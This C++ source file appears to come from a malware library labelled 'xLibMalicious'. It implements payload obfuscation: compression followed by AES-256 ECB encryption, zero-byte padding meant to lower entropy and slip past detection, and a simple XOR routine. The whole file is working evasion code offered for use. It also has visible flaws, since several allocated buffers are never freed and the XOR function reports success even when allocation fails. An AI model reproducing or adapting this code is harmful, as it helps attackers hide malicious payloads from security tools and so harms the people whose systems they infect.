//
// skulk@ioc.ninja
//
#include "xObfuscation.h"

#include "aes256.h"

#include "xCompression.h"
#include "xLibMaliciousApi.h"
#include "xLibMaliciousExternalApi.h"



#define X_OBFUSCATION_ENTROPY_REDUCE_FACTOR			2
#define X_OBFUSCATION_ENTROPY_REDUCE_MORE_FACTOR	3
#define X_OBFUSCATION_ENTROPY_DATA					0x00



bool xObfuscationObfuscateAes(const uint8_t* key, const uint32_t keySize, const uint8_t* plain, const uint32_t plainSize, uint8_t** obfuscated, uint32_t* obfuscatedSize, const xObfuscationEntropy entropy)
{
	if (!key || keySize != 32 || !plain || !plainSize || !obfuscated || !obfuscatedSize || (entropy != xObfuscationEntropyDefault && entropy != xObfuscationEntropyReduce && entropy != xObfuscationEntropyReduceMore))
	{
		return false;
	}

	bool result = false;

	// Compress
	uint8_t* compressed = NULL;

	uint32_t compressedSize = 0;

	if (X_LIB_MALICIOUS_CALL(xCompressionCompress)(plain, plainSize, &compressed, &compressedSize))
	{
		const uint32_t blockSize = keySize / 2;

		const uint32_t payloadSize = sizeof(uint32_t) + compressedSize;

		const uint32_t bufferSize = payloadSize + (blockSize - payloadSize % blockSize);

		uint8_t* buffer = (uint8_t*) X_LIB_MALICIOUS_CALL(xMemoryAlloc)(bufferSize);

		// Obfucate
		if (buffer)
		{
			X_LIB_MALICIOUS_CALL(xMemoryCopy)(buffer, &compressedSize, sizeof(compressedSize));

			X_LIB_MALICIOUS_CALL(xMemoryCopy)(buffer + sizeof(compressedSize), compressed, compressedSize);

			aes256_context ctx;

			X_LIB_MALICIOUS_EXTERNAL_CALL(aes256_init)(&ctx, const_cast<uint8_t*>(key));

			for (uint32_t i = 0; i < bufferSize; i += (keySize / 2))
			{
				X_LIB_MALICIOUS_EXTERNAL_CALL(aes256_encrypt_ecb)(&ctx, buffer + i);
			}

			X_LIB_MALICIOUS_EXTERNAL_CALL(aes256_done)(&ctx);

			uint32_t outSize = 0;

			switch (entropy)
			{
				case xObfuscationEntropyDefault:
				{
					outSize = bufferSize;

					break;
				}
				case xObfuscationEntropyReduce:
				{
					outSize = bufferSize * X_OBFUSCATION_ENTROPY_REDUCE_FACTOR;

					break;
				}
				case xObfuscationEntropyReduceMore:
				{
					outSize = bufferSize * X_OBFUSCATION_ENTROPY_REDUCE_MORE_FACTOR;

					break;
				}
			}

			uint8_t* out = (uint8_t*) X_LIB_MALICIOUS_CALL(xMemoryAlloc)(outSize);

			if (out)
			{
				for (uint32_t i = 0; i < outSize; i++)
				{
					out[i] = buffer[i / (outSize / bufferSize)];

					switch (entropy)
					{
						case xObfuscationEntropyReduce:
						{
							i++;

							out[i] = X_OBFUSCATION_ENTROPY_DATA;

							break;
						}
						case xObfuscationEntropyReduceMore:
						{
							i++;

							out[i] = X_OBFUSCATION_ENTROPY_DATA;

							i++;

							out[i] = X_OBFUSCATION_ENTROPY_DATA;

							break;
						}
					}
				}

				*obfuscated = out;

				*obfuscatedSize = outSize;

				result = true;
			}
		}

		X_LIB_MALICIOUS_CALL(xMemoryFree)(compressed);
	}

	return result;
}

bool xObfuscationDeobfuscateAes(const uint8_t* key, const uint32_t keySize, const uint8_t* obfuscated, const uint32_t obfuscatedSize, uint8_t** plain, uint32_t* plainSize, const xObfuscationEntropy entropy)
{
	if (!key || keySize != 32 || !obfuscated || !obfuscatedSize || !plain || !plainSize)
	{
		return false;
	}

	bool result = false;

	uint32_t bufferSize = 0;

	switch (entropy)
	{
		case xObfuscationEntropyDefault:
		{
			bufferSize = obfuscatedSize;

			break;
		}
		case xObfuscationEntropyReduce:
		{
			bufferSize = obfuscatedSize / X_OBFUSCATION_ENTROPY_REDUCE_FACTOR;

			break;
		}
		case xObfuscationEntropyReduceMore:
		{
			bufferSize = obfuscatedSize / X_OBFUSCATION_ENTROPY_REDUCE_MORE_FACTOR;

			break;
		}
	}

	uint8_t* buffer = (uint8_t*) X_LIB_MALICIOUS_CALL(xMemoryAlloc)(bufferSize);

	if (buffer)
	{
		for (uint32_t i = 0; i < bufferSize; i++)
		{
			buffer[i] = obfuscated[i * (obfuscatedSize / bufferSize)];
		}

		aes256_context ctx;

		X_LIB_MALICIOUS_EXTERNAL_CALL(aes256_init)(&ctx, const_cast<uint8_t*>(key));

		for (uint32_t i = 0; i < bufferSize; i += (keySize / 2))
		{
			X_LIB_MALICIOUS_EXTERNAL_CALL(aes256_decrypt_ecb)(&ctx, buffer + i);
		}

		X_LIB_MALICIOUS_EXTERNAL_CALL(aes256_done)(&ctx);

		uint32_t compressedSize =  0;

		X_LIB_MALICIOUS_CALL(xMemoryCopy)(&compressedSize, buffer, sizeof(compressedSize));

		uint8_t* compressed = (uint8_t*) X_LIB_MALICIOUS_CALL(xMemoryClone)(buffer + sizeof(compressedSize), compressedSize);

		uint8_t* out = NULL;

		uint32_t outSize = 0;

		if (X_LIB_MALICIOUS_CALL(xCompressionDecompress)(compressed, compressedSize, &out, &outSize))
		{
			*plain = out;

			*plainSize = outSize;

			result = true;
		}
	}

	return result;
}

bool xObfuscationObfuscateXor(const uint8_t key, const uint8_t* plain, const uint32_t plainSize, uint8_t** obfuscated)
{
	if (!key || !plain || !plainSize || !obfuscated)
	{
		return false;
	}

	uint8_t* buffer = (uint8_t*) X_LIB_MALICIOUS_CALL(xMemoryAlloc)(plainSize);

	if (buffer)
	{
		memcpy(buffer, plain, plainSize);

		for (uint32_t i = 0; i < plainSize; i++)
		{
			buffer[i] ^= key;
		}
	}

	*obfuscated = buffer;

	return true;
}

bool xObfuscationDeobfuscateXor(const uint8_t key, const uint8_t* obfuscated, const uint32_t obfuscatedSize, uint8_t** plain)
{
	return X_LIB_MALICIOUS_CALL(xObfuscationObfuscateXor)(key, obfuscated, obfuscatedSize, plain);
}
